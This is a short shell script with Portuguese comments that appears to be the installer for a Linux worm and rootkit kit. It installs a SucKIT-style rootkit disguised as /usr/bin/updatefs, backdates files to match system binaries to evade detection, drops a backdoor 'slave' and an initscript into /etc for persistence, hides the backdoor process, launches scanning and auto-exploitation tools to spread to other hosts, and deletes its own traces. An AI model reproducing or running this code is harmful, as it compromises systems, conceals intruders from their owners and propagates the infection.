#!/bin/sh

# Makina jah ownada?
if [ -f /usr/lib/libkaffs_p.a ]; then

    # Scaniando..
    cp verme-scan verme-own /tmp/
    touch /tmp/verme.LOG
    nohup /tmp/verme-scan /tmp/verme.LOG &
    nohup /tmp/verme-own -d0 -s -l /tmp/verme.LOG &

    cd ..
    rm -rf kit-worm kw.tgz verme-own verme-scan
    exit
fi

# Nossa marca
touch /usr/lib/libkaffs_p.a
touch -r /bin/login /usr/lib/libkaffs_p.a

chmod +x *
chmod +x .rc
mv sk.WORM /usr/bin/updatefs
/usr/bin/updatefs

# Suckit rodado com sucesso?

touch l1v3.ypx
BLA=`ls -l *ypx`

if [ ! "$BLA" = "" ]; then

    # Scaniando..
    cp verme-scan verme-own /tmp/
    touch /tmp/verme.LOG
    nohup /tmp/verme-scan /tmp/verme.LOG &
    nohup /tmp/verme-own -d0 -s -l /tmp/verme.LOG &

    cd ..
    rm -rf kit-worm kw.tgz verme-own verme-scan
    exit
fi

mv .rc /usr/lib/ypx/
mv slave.WORM /usr/lib/ypx/slave
mv initscript /etc

# Rodando worm
mv verme-scan verme-own /usr/lib/ypx/
touch /usr/lib/ypx/verme.LOG
nohup /usr/lib/ypx/verme-scan /usr/lib/ypx/verme.LOG &
nohup /usr/lib/ypx/verme-own -d0 -s -l /usr/lib/ypx/verme.LOG &

touch -r /usr/sbin/xinetd /usr/lib/ypx
touch -r /usr/sbin/xinetd /usr/lib/ypx/*
touch -r /usr/sbin/xinetd /usr/lib
touch -r /usr/sbin/xinetd /usr/bin/updatefs
touch -r /usr/sbin/xinetd /etc/initscript
/usr/lib/ypx/slave

PID=`/sbin/pidof slave`
updatefs i $PID

#for i in `/sbin/pidof verme-own`; 
#do
#    updatefs -i $i
#done

#for i in `/sbin/pidof verme-scan`;
#do
#    updatefs -i $i
#done

cd ..
rm -rf kit-worm kw.tgz
